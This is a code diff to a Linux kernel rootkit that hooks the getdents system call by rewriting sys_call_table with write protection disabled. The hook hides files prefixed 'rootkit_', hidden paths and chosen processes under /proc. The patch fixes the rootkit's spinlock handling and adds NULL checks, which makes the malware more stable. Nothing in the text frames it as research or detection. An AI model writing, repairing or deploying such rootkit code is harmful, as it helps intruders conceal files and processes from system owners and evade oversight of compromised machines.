@@ -19,7 +19,7 @@ asmlinkage ssize_t (*syscall_readlink) (const char *path, char *buf, size_t bufs
  * spinlock
  */
 static int getdents_call_counter = 0;
-static spinlock_t *getdents_lock;
+static spinlock_t getdents_lock;
 static unsigned long getdents_lock_flags;
 
 
@@ -31,6 +31,10 @@ get_fname_from_path(char *path)
 {
 	char *ptr, *name;
 	char delimiter = '/';
+	
+	if(path == NULL) {
+		return NULL;
+	}
 	
 	ptr = strrchr(path, delimiter);
 	name = ptr + 1;
@@ -45,7 +49,11 @@ get_fname_from_path(char *path)
  */
 int
 check_hide_fpath(char *path)
-{	
+{
+	if(path == NULL) {
+		return 0;
+	}
+	
 	return is_path_hidden(path);
 }
 
@@ -56,7 +64,17 @@ check_hide_fpath(char *path)
 int
 check_hide_fprefix(char *path)
 {
-	char *d_name = get_fname_from_path(path);
+	char *d_name;
+
+	if(path == NULL) {
+		return 0;
+	}
+	
+	d_name = get_fname_from_path(path);
+
+	if(d_name == NULL) {
+		return 0;
+	}
 	
 	// TODO: implement dynamic prefixes
 	if(strstr(d_name, "rootkit_") == d_name) 
@@ -86,7 +104,11 @@ check_hide_process(int fd, char *d_name)
 		ROOTKIT_DEBUG("Something probably went wrong in check_hide_process().\n");
 		return 0;
 	}
-
+	
+	if(dir == NULL) {
+		return 0;
+	}
+	
 	if(strcmp(dir, "/proc") == 0) {
 		return is_process_hidden(convert_atoi(d_name));
 	}
@@ -137,7 +159,7 @@ asmlinkage int
 manipulated_getdents (unsigned int fd, struct linux_dirent __user *dirp, unsigned int count)
 {
 	/* lock and increase the call counter */
-	INCREASE_CALL_COUNTER(getdents_call_counter, getdents_lock, getdents_lock_flags);
+	INCREASE_CALL_COUNTER(getdents_call_counter, &getdents_lock, getdents_lock_flags);
 		
 	long ret;
 	int len = 0;
@@ -167,7 +189,7 @@ manipulated_getdents (unsigned int fd, struct linux_dirent __user *dirp, unsigne
 	}
 	
 	/* lock and decrease the call counter */
-	DECREASE_CALL_COUNTER(getdents_call_counter, getdents_lock, getdents_lock_flags);
+	DECREASE_CALL_COUNTER(getdents_call_counter, &getdents_lock, getdents_lock_flags);
 
 	return ret;
 }
@@ -180,7 +202,7 @@ hook_getdents(void) {
 	void **sys_call_table = (void *) sysmap_sys_call_table;
 	
 	/* initialize our spinlock for the getdents counter */
-	spin_lock_init(getdents_lock);
+	spin_lock_init(&getdents_lock);
 
 	/* get the 'readlink' syscall */
 	syscall_readlink = (void*) sys_call_table[__NR_readlink];
@@ -215,13 +237,13 @@ unhook_getdents(void) {
 	while(getdents_call_counter > 0) {
 		msleep(10);
 	}
-	spin_lock_irqsave(getdents_lock, getdents_lock_flags);
+	spin_lock_irqsave(&getdents_lock, getdents_lock_flags);
 
 	/* restore the old syscall */
 	sys_call_table[__NR_getdents] = (int *) original_getdents;
 
 	/* release our lock on getdents */
-	spin_unlock_irqrestore(getdents_lock, getdents_lock_flags);
+	spin_unlock_irqrestore(&getdents_lock, getdents_lock_flags);
 	
 	/* reenable write protection */
 	enable_page_protection();
